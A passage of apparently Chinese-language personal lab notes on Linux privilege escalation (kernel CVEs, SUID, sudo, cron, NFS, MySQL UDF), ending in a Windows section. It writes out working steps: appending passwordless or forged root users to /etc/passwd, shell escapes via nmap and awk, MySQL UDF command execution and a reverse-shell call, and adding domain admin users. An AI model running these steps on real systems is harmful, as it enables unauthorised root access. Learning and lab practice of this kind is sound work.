href="https://github.com/mzet-/linux-exploit-suggester%EF%BC%88%E8%BF%99%E4%B8%AA%E5%B7%A5%E5%85%B7%E5%8F%AF%E4%BB%A5%E5%A4%A7%E8%87%B4%E6%A3%80%E6%B5%8B%E4%B8%80%E4%BA%9BLinux%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%89">https://github.com/mzet-/linux-exploit-suggester（这个工具可以大致检测一些Linux可能存在的漏洞）</a></li><li><a href="https://github.com/jondonas/linux-exploit-suggester-2%EF%BC%88%E4%BD%BF%E7%94%A8%E7%9A%84perl%E8%AF%AD%E8%A8%80%EF%BC%8C%E4%B8%8D%E4%B8%80%E5%AE%9A%E6%AF%8F%E4%B8%AA%E4%B8%BB%E6%9C%BA%E9%83%BD%E8%83%BD%E6%89%A7%E8%A1%8C%EF%BC%89">https://github.com/jondonas/linux-exploit-suggester-2（使用的perl语言，不一定每个主机都能执行）</a></li></ol><blockquote><p>内核提权一般是作为最后选项，因为exp执行后远程主机可能会崩溃，许多公开可用的提权漏洞并不是很稳定，目标主机也可能在你得到root权限后直接崩溃，并且漏洞利用可能会留下导致被捕获的痕迹/日志。</p></blockquote><h6 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h6><p>漏洞环境：ubuntu16.04    Linux Kernel 4.15</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720103606519.png" alt="image-20210720103606519"></p><p>首先使用工具检测一下可能存在的提权漏洞</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720103951085.png" alt="image-20210720103951085"></p><p><strong>CVE-2019-13272</strong>（该漏洞利用前提:需要目标服务器有桌面环境）</p><p><a href="https://0x20h.com/p/fe4f#pkexec">https://0x20h.com/p/fe4f#pkexec</a></p><p>漏洞影响版本：Linux Kernel &lt; 5.1.17</p><p>…………上面工具没有检测出这个漏洞，这里尝试直接利用这个漏洞</p><p><a href="https://github.com/bcoles/kernel-exploits">https://github.com/bcoles/kernel-exploits</a> 下载EXP</p><p>编译c文件，并且需要赋予可执行权限</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720104648771.png" alt="image-20210720104648771"></p><p>直接执行，获取到root权限</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720104735795.png" alt="image-20210720104735795"></p><blockquote><p>这个复现过程很简单，但是原理很难，这个CVE由于需要目标主机是桌面版所以平时的用处不大。</p></blockquote><p><strong>CVE-2021-33909</strong></p><p>影响范围：Linux kernel 3.16 - 5.13.x</p><blockquote><p>暂无EXP，提权范围挺广的</p></blockquote><h5 id="利用SUID提权"><a href="#利用SUID提权" class="headerlink" title="利用SUID提权"></a>利用SUID提权</h5><p>参考文章：</p><p><a href="https://jlkl.github.io/2020/01/27/Web_15/">https://jlkl.github.io/2020/01/27/Web_15/</a></p><p>SUID是一种特殊的权限，可以让调用者在执行的过程中暂时获得该文件的拥有者的权限。如果找到root用户拥有的SUID文件并运行，就可以暂时获取到root用户的权限</p><p>查找具有SUID权限位并且属与root的文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">find</span> / -user root -perm -4000 -<span class="hljs-builtin-name">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-builtin-name">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-builtin-name">find</span> / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;<br>………<br></code></pre></td></tr></table></figure><p>常见可以用来提权的命令</p><ol><li><code>nmap</code></li><li><code>find</code></li><li><code>vim</code></li><li><code>bash</code></li><li><code>nano</code></li><li><code>cp/mv</code></li><li><code>more/less</code></li><li><code>awk</code></li><li><code>apt</code></li><li>…………</li></ol><p><strong>namp提权</strong></p><p> 在<code>nmap 5.20</code>以前存在<code>interactive</code>交互模式，可以利用这个交互模式提权</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">nmap</span> <span class="hljs-string">--interactive</span><br><span class="hljs-comment">!sh</span><br></code></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</a></p><p>P神里面对新的<code>nmap</code>提权做了深入的解释，简单写一下我的理解</p><p>SUID提权主要还是灵活利用了对于普通用户当前运行命令时的<code>Effective UID</code>，只有这个程序的所有者是0号或其他super user，同时拥有<code>suid</code>权限，才可以提权。<code>nmap</code>具有了<code>suid</code>时和其他命令具有<code>suid</code>是有区别的。</p><p>新版的<code>nmap</code>没有了<code>interactive</code>交互模式，并且随着Linux新版本的更新研究人员也对<code>suid</code>提权做了限制。这里采用了新的方法来使用<code>nmap</code>提权，添加用户</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">local file = io.open(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>file:write(<span class="hljs-string">&quot;root2::0:0::/root:/bin/bash\n&quot;</span>)<br>file:close()<br></code></pre></td></tr></table></figure><p>为<code>nmap</code>赋予<code>root</code>用户的<code>suid</code>权限</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720170143300.png" alt="image-20210720170143300"></p><p>执行上面的脚本，成功添加了一个root用户，直接切换用户获取到权限</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720170302762.png" alt="image-20210720170302762"></p><p><strong>find提权</strong></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720140111241.png" alt="image-20210720140111241"></p><p>查询到<code>find</code> 具有<code>suid</code>权限，进行<code>find</code>提权</p><p>先创建一个文件，中途借用这个文件来执行命令</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720140532708.png" alt="image-20210720140532708"></p><p>成功提升了权限</p><p><strong>bash</strong></p><p><code>bash -p</code> 开启一个新的shell，如果是suid的话就是获取到root的shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720142200911.png" alt="image-20210720142200911"></p><p>执行命令获取权限</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720142318447.png" alt="image-20210720142318447"></p><p><strong>cp / mv</strong></p><p>覆盖<code>/etc/shadow</code> 或者 <code>/etc/passwd</code></p><blockquote><p>需要小心一点，命令不要弄错了不然容易改崩用户</p></blockquote><p>查看具有SUID权限的命令</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720152342842.png" alt="image-20210720152342842"></p><p>伪造用户</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">lcdm123<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cat /etc/passwd &gt; passwd  将文件复制出来<br>lcdm123<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>openssl passwd <span class="hljs-number">-1</span> -salt hack hack123  伪造密码<br>lcdm123<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>echo <span class="hljs-string">&#x27;hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash&#x27;</span> &gt;&gt; passwd 密码写入复制文件<br>lcdm123<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cp passwd /etc/passwd  修改正常的passwd文件<br>lcdm123<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>su - hack 填入密码即可<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720152752202.png" alt="image-20210720152752202"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720152821108.png" alt="image-20210720152821108"></p><p><code>mv</code>同理类似</p><p><strong>vim vi nano等编辑器</strong></p><p>可以直接选择写入一个<code>root</code>权限用户，不用网上那种花里胡哨的方法，网上的搞了半天也没有成功</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210720173740391.png" alt="image-20210720173740391"></p><p><strong>less/more</strong></p><blockquote><p>暂时没有成功获得权限</p></blockquote><p><strong>awk</strong></p><p><code>awk</code>是一种处理文件的语言，是文本分析工具</p><p> 提权命令：<code>awk &#39;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#39;</code></p><blockquote><p>环境没有搭建好，暂时没有成功</p></blockquote><p><strong>总结</strong></p><p>个人感觉<code>suid</code>提权，主要是网站管理人员的疏忽，使用这个方法只能看运气，平时多积累一点各种命令提权的方法</p><h5 id="SUDO提权"><a href="#SUDO提权" class="headerlink" title="SUDO提权"></a>SUDO提权</h5><ol><li><p><code>sudo</code>无密码，可以查看<code>/etc/sudoers</code>或者使用<code>sudo -l</code>来查看</p><blockquote><p>经过多次练习，发现sudo提权还是很有用的</p></blockquote><p>案例</p><p><code>sudo -l</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210818142203251.png" alt="image-20210818142203251"></p><p>执行命令<code>sudo apt changelog apt</code>提权</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210818142004907.png" alt="image-20210818142004907"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210818142230467.png" alt="image-20210818142230467"></p></li><li><p>CVE-2021-3156</p><p>漏洞原因：当<code>sudo</code>通过<code>-s</code>或者<code>-i</code>命令行选项在shell模式下运行命令是，它会把命令参数中使用反斜杠转义特殊字符，但是使用<code>-s</code>或者<code>-i</code>标志运行sudoedit时，实际上并没有进行转义，从而导致了缓冲区溢出漏洞，只要存在sudoers文（/etc/sudoers），就可以提权了。</p><p>影响版本：<code>sudo 1.8.2-1.8.31p2   1.9.0-1.9.5p1</code></p><p>漏洞检测：<code>sudo --verison</code> 查看版本</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210721095440738.png" alt="image-20210721095440738"></p><p>利用exp来提权：<a href="https://github.com/blasty/CVE-2021-3156%EF%BC%8C%E6%B2%A1%E6%9C%89%E5%8F%91%E7%8E%B0%E9%80%82%E5%90%88ubuntu16.04%E7%89%88%E6%9C%AC%E7%B3%BB%E7%BB%9F%E7%9A%84exp%EF%BC%8C%E6%89%80%E4%BB%A5%E4%BD%BF%E7%94%A818.04%E7%89%88%E6%9C%AC%E6%9D%A5%E6%B5%8B%E8%AF%95%E3%80%82">https://github.com/blasty/CVE-2021-3156，没有发现适合ubuntu16.04版本系统的exp，所以使用18.04版本来测试。</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210721102908854.png" alt="image-20210721102908854"></p><p>先make，然后执行文件，选择相应的系统即可（这里提供的选择比较少，也没有找到其他合适的exp）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210721104615754.png" alt="image-20210721104615754"></p></li></ol><blockquote><p><del>感觉SUDO提权没有SUID提权舒服</del></p></blockquote><h5 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a>计划任务提权</h5><p>crontab命令用来定期执行程序</p><p>语法格式</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs awk">-e   编辑当前的crontab文件，默认保存在<span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>用户名下<br>-r   删除目前的时程表<br>-l   列出目前的时程表<br><br><br>分 时 日 月 周 需要执行的命令<br><br>分：<span class="hljs-number">0</span>~<span class="hljs-number">59</span><br>时：<span class="hljs-number">0</span>~<span class="hljs-number">23</span><br>日：<span class="hljs-number">1</span>~<span class="hljs-number">31</span><br>月：<span class="hljs-number">1</span>~<span class="hljs-number">12</span><br>周：<span class="hljs-number">0</span>~<span class="hljs-number">6</span> <span class="hljs-comment">#0代表周日</span><br>*：（星号）代表取值范围中的每一个数字<br>-：（减号）连续区间表达式，想要代表<span class="hljs-number">1</span>~<span class="hljs-number">7</span>，则需要写成<span class="hljs-number">1</span>-<span class="hljs-number">7</span><br><span class="hljs-regexp">/：（斜杠）表示每x个。例如想在每10分钟执行一次，则在分的位置写：*/</span><span class="hljs-number">10</span><br>,：（逗号）表示多个取值。如果想在<span class="hljs-number">1</span>点，<span class="hljs-number">3</span>点，<span class="hljs-number">5</span>点执行一次，则在时的位置写：<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span><br><br>*<span class="hljs-regexp">/2 * * * * echo `date` &gt;&gt; /</span>tmp/stu01<br>表示每两分钟输出时间到<span class="hljs-regexp">/tmp/</span>stu01文件<br><br><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/u</span>ser 用来区分每个用户自己的执行计划<br><span class="hljs-regexp">/etc/</span>crontab 表示系统执行计划，需要在五个*后面加上用户<br>*<span class="hljs-regexp">/1 * * * * root  ls /</span>&gt;&gt; <span class="hljs-regexp">/tmp/</span>cron<br><span class="hljs-regexp">/etc/</span>cron.deny   表示只拒绝哪些用户不能他用crontab，默认存在空文件<br><span class="hljs-regexp">/etc/</span>cron.allow  表示只允许哪些用户使用crontab<br><br>查看定时任务：cat <span class="hljs-regexp">/etc/</span>crontab<br></code></pre></td></tr></table></figure><p>原理就是通过修改root用户的定时任务的内容来提权</p><ol><li><p>root权限的定时任务脚本普通用户可写</p><ul><li>root权限执行的定时任务或者其所在的文件夹，地权限用户拥有写权限，则可以进行提权</li></ul><p>首先以root用户的身份创建了一个定时任务，每分钟向文件中写入字符串</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210721112724742.png" alt="image-20210721112724742"></p><blockquote><p> 本地测试时后默认的<code>/var/spool/cron/crontabs</code>普通用户没有可读权限</p></blockquote><p>这里使用普通用户修改root用户的定时脚本</p><p>修改定时任务内容提权的方法就有很多了，可以直接添加用户，反弹shell，…………</p></li><li><p>root权限的定时任务调用的脚本普通用户可写</p><ul><li>定时任务可能并不是孤立存在的，他会调用很多别的shell脚本来完成操作，root权限定时任务调用的脚本也是以root权限执行的</li></ul><p>这个的大致过程和上面的一样</p></li></ol><blockquote><p>对于计划任务提权的方法，需要有对一些文件的可写可读权限，限制还是比较大的，不是特别方便。</p></blockquote><h5 id="NFS提权"><a href="#NFS提权" class="headerlink" title="NFS提权"></a>NFS提权</h5><p>NFS（网络文件系统），是一个客户端/服务端应用程序，是一个共享目录。</p><p>执行<code>cat /etc/exports</code> 如果有<code>no_root_squash</code>字样，就说明root用户对共享目录有很高的权限控制，就像在本地一样，我们在获得一台机器的root权限后就可以通过nfs在另一台低权限机器上实现提权。</p><p>提权的过程就是利用高权限主机在共享目录中创建复制一个bash，然后再赋予suid权限，这样就可以提权了</p><blockquote><p>平时遇到情况不多</p></blockquote><h5 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h5><p><a href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p><ol><li><p>UDF提权</p><p><strong>原理</strong>：用户通过数据库中的自定义函数功能，添加新的函数。</p><p><strong>攻击过程</strong></p><ol><li><p>选择动态链接库</p><p>如果是 MySQL&gt;=5.1 版本，就必须把UDF的动态链接库文件放置于MySQL安装目录下的lib\plugin文件夹下面才能创建自定义函数，动态链接库文件在常用的sqlmap（/data/udf/mysql）和MSF（/embedded/framework/data/exploits/mysql）中就有</p><blockquote><p>sqlmap中的动态链接库为了防止被误杀都被经过了编码处理，需要使用sqlmap自带的解码工具解码后使用（/extra/cloak/cloak.py）</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 解码 32 位的 Linux 动态链接库</span><br>➜ python3 cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/linux/</span><span class="hljs-number">32</span>/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so<br><br><span class="hljs-comment"># 解码 64 位的 Linux 动态链接库</span><br>➜ python3 cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/linux/</span><span class="hljs-number">64</span>/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so<br><br><span class="hljs-comment"># 解码 32 位的 Windows 动态链接库</span><br>➜ python3 cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/windows/</span><span class="hljs-number">32</span>/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll<br><br><span class="hljs-comment"># 解码 64 位的 Windows 动态链接库</span><br>➜ python3 cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/windows/</span><span class="hljs-number">64</span>/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll<br></code></pre></td></tr></table></figure></li><li><p>找到靶机中动态链接库的存放位置</p><p><code>show variables like &#39;%plugin%&#39;;</code></p><blockquote><p>如果不存在，可以依靠自己手工在MySQL的安装目录创建\lib\plugin文件夹</p><p>寻找安装目录：select @@basedir;</p></blockquote></li><li><p>写入动态链接库</p><ul><li><p>有SQL注入并且是最高权限，plugin目录可以写入并且需要<code>secure_file_priv</code>无限制，MySQL插件目录可以被MySQL写入，这个时候就可以使用sqlmap上传动态链接库，GET请求有字节长度限制，所以一般POST请求才可以执行这样的攻击。</p></li><li><p>无SQL注入就直接操作SQL语句，当<code>secure_file_priv</code>无限制的时候，我们也可以直接写入plugin目录下</p><ul><li><p>写入时最好将内容使用十六进制编码再写入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">seler 0x………… into dumpfile path;<br>outfile：多行写入<br>dumpfile：单行写入<br>如脱库时，那就用outfile更好使，但是如果用outfife去导出二进制文件时，就会出错，因为outfile函数会在行末端写入新行，更致命的是会转义换行符，这样的话这个二进制可执行文件就会被破坏，所以一般导出导出二进制文件(udf提权)时就用dumpfile<br><br>获取十六进制<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">hex</span>(<span class="hljs-keyword">load_file</span>(<span class="hljs-string">&#x27;/lib_mysqludf_sys_64.so&#x27;</span>));<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">hex</span>(<span class="hljs-keyword">load_file</span>(<span class="hljs-string">&#x27;/lib_mysqludf_sys_64.so&#x27;</span>)) <span class="hljs-keyword">into</span> <span class="hljs-keyword">dumpfile</span> <span class="hljs-string">&#x27;/tmp/udf.txt&#x27;</span>; 导入文件中方便观察<br></code></pre></td></tr></table></figure></li><li><p>也可以先写入小马，获取shell，再直接上传文件</p></li></ul></li></ul></li><li><p>创建自定义函数，并调用命令</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> sys_eval <span class="hljs-keyword">RETURNS</span> <span class="hljs-keyword">STRING</span> <span class="hljs-keyword">SONAME</span> <span class="hljs-string">&#x27;udf.dll&#x27;</span>; 创建函数<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> mysql.func; 查询是否新增了函数<br><span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&quot;whoami&quot;</span>); 执行命令<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">function</span> sys_eval; 删除自定义函数<br></code></pre></td></tr></table></figure></li></ol><blockquote><p>如果数据库在内网，无法直接连接MySQL或者MySQL不允许外连，我们就可以使用网页脚本（类似于大马）PHP大马脚本：<a href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php%EF%BC%9B%E4%B9%9F%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8Navicat%E7%BB%93%E5%90%88%E5%AE%83%E8%87%AA%E5%B8%A6%E7%9A%84tunnel%E9%9A%A7%E9%81%93%E8%84%9A%E6%9C%AC%E6%90%AD%E5%BB%BAHTTP%E9%80%9A%E9%81%93%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E3%80%82">https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php；也可以使用Navicat结合它自带的tunnel隧道脚本搭建HTTP通道连接数据库。</a></p></blockquote><p><strong>反弹shell</strong></p><p>使用被定制好的动态链接库，调用函数来执行命令，反弹shell等</p><p>工具下载：<a href="https://sqlsec.lanzoux.com/iEQA0ijfu6d">https://sqlsec.lanzoux.com/iEQA0ijfu6d</a></p><p>同样的导入然后创建函数</p><p><code>CREATE FUNCTION backshell RETURNS STRING SONAME &#39;udf.dll&#39;;</code></p><p>反弹shell</p><p><code>select backshell(&quot;IP&quot;, port);</code></p></li><li><p>MOF提权</p><p>MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功。总结Windows的时候再仔细补充。</p></li><li><p>启动项提权</p><p>常见于Windows，后面Windows提权的时候在补充</p></li><li><p>CVE-2016-6663</p><p><strong>漏洞详情</strong>：竞争条件提权漏洞，一个拥有 CREATE/INSERT/SELECT 低权限的账户提权成功后可以系统用户身份执行任意代码，提权的用户为 mysql 用户，概括一下就是将低权限的 www-data 权限提升为 mysql 权限，要获取root用户权限，需要结合之前的提权方法进一步操作。</p><p><strong>漏洞条件：</strong></p><ol><li>Getshell 拿到 www-data 权限</li><li>拿到 CREATE/INSERT/SELECT 低权限的 MySQL 账户</li><li>关键提取步骤需要在交互环境下，所以需要反弹shell</li><li>MySQL版本需要 &lt;=5.5.51 或 5.6.x &lt;=5.6.32 或 5.7.x &lt;=5.7.14 或 8.x &lt; 8.0.1</li><li>MariaDB版本需要 &lt;= 5.5.51 或 10.0.x &lt;= 10.0.27 或 10.1.x &lt;= 10.1.17</li></ol><p><strong>漏洞复现</strong></p><p>环境搭建：使用国光师傅的docker环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 拉取镜像</span><br>docker pull sqlsec/cve-2016-6663<br><span class="hljs-comment"># 部署镜像</span><br>docker run -d -p 3306:3306 -p 8080:80 --name CVE-2016-6663 sqlsec/cve-2016-6663<br></code></pre></td></tr></table></figure><p>连接上shell，获得一个低权限用户密码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210721164602551.png" alt="image-20210721164602551"></p><p>上传EXP，并且编译执行</p><p>​    EXP：<a href="https://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c">https://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c</a></p><p>​    编译EXP：<code>gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient</code></p><p>​    执行EXP进行提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">./mysql-privesc-race 数据库用户名 密码 数据库地址 数据库<br><br>./mysql-privesc-race <span class="hljs-built_in">test</span> 123456 localhost <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>使用蚁剑，冰蝎直接执行有提权问题，所以还是需要反弹shell执行</p><p>提权成功，进一步提权上面指出需要<code>CVE-2016-6662 or CVE-2016-6664</code>，也可以看看有没有其他的提权漏洞</p></li></ol><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h4 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h4><p><a href="https://wh0ale.github.io/2018/12/19/2018-12-19-%E5%9F%9F%E6%B8%97%E9%80%8F/">https://wh0ale.github.io/2018/12/19/2018-12-19-%E5%9F%9F%E6%B8%97%E9%80%8F/</a></p><blockquote><p>感觉对于Windows用的比较多的还是图形化界面，命令的使用不是特别多</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ipconfig /all 查看IP<br>whoami 查看当前用户<br>systmeinfo 查看详细信息<br>netstat -ano 查看端口开放情况<br>tracert ip/域名  路由追踪<br>ping 检测主机之间的连通性<br>ipconfig /fulshdns 刷新本地DNS缓存<br><br>tasklist 显示当前运行的进程<br>taskkill /pid pidnum 结束进程<br>net start 显示当前运行的服务<br>net start 服务名  启动服务<br>net stop 服务名  停止指定服务<br>net statistics workstation 查看系统开机时间<br><br>dir 列出当前目录文件<br>d:   e:  切换到对应磁盘<br>tree 显示目录结构<br><br>添加用户  net<span class="hljs-built_in"> user </span>username password  /add<br>添加域用户 net<span class="hljs-built_in"> user </span>username password /<span class="hljs-builtin-name">add</span> /domain<br>添加用户到域管 net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;Domain Admins&quot;</span> username /<span class="hljs-builtin-name">add</span> /domain<br></code></pre></td></tr></table></figure><h4 id="Windows协议"><a href="#Windows协议" class="headerlink" title="Windows协议"></a>Windows协议</h4><h5 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h5><p><a href="https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/">https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/</a></p><p>Kerberos协议是一种计算机网络认证协议，它可以为网络中通信的双方提供严格的身份验证服务，确保通信双方身份的真实性和安全性。主要用于域环境</p><p>协议的组成：</p><ul><li><p>客户端（client）</p></li><li><p>服务端（Server）</p></li><li><p>密钥分发中心（KDC）：密钥分发中心又分为两部分</p><ul><li>AS：认证服务器，专门用来认证客户端身份并发放客户用户访问TGS的TGT（票据授予票据）</li><li>TGS：票据授予服务器</li></ul><blockquote><p>KDC与在域控运行的其他安全服务集成，KDC使用域的AD域服务器数据库作为其安全数据库，AD域服务是域或林中默认的Kerberos实现必须的。一般情况下KDC安装在域控中，Client和Server为域内的用户或者服务</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210722100209527.png" alt="image-20210722100209527"></p><p>认证流程（身份认证服务交换，票据授权服务交换，客户端/服务认证交换）</p><ol><li><p>Client先向KDC发起请求，请求的凭据就是Client hash加密的时间戳</p></li><li><p>KDC使用Client hash解密，如果正确就返回解密的TGT，TGT中包含了PAC，PAC中包含了Client的sid，Client所在的组</p><blockquote><p>PAC(Privilege Attribute Certificate)特权属性证书，不同账户有不同的权限，PAC就是用来区分不同权限的</p></blockquote></li><li><p>Client凭借TGT票据向KDC发起针对特定服务的请求</p></li><li><p>KDC解密，如果正确就返回加密的TGS（不管用户有没有访问权限，TGT正确就会返回TGS票据）</p></li><li><p>Client拿着TGS票据去请求服务</p></li><li><p>Server解密TGS，验证身份</p></li></ol></li></ul><p>相关漏洞：MS14-068利用kerberos漏洞获取到域控权限，黄金票据，白银票据</p><h5 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h5><p>Windows内部只保存了密码的hash，并不保存明文密码，本机用户的hash保存在本地的<strong>SAM文件</strong>中，当我们登录系统时，系统会自动读取SAM文件中的密码与我们输入的密码对比，是否相同；域内用户的hash保存在域控的<strong>NTDS.dit</strong>文件中</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210722110852458.png" alt="image-20210722110852458"></p><ul><li>NTLM Hash 是支持Net 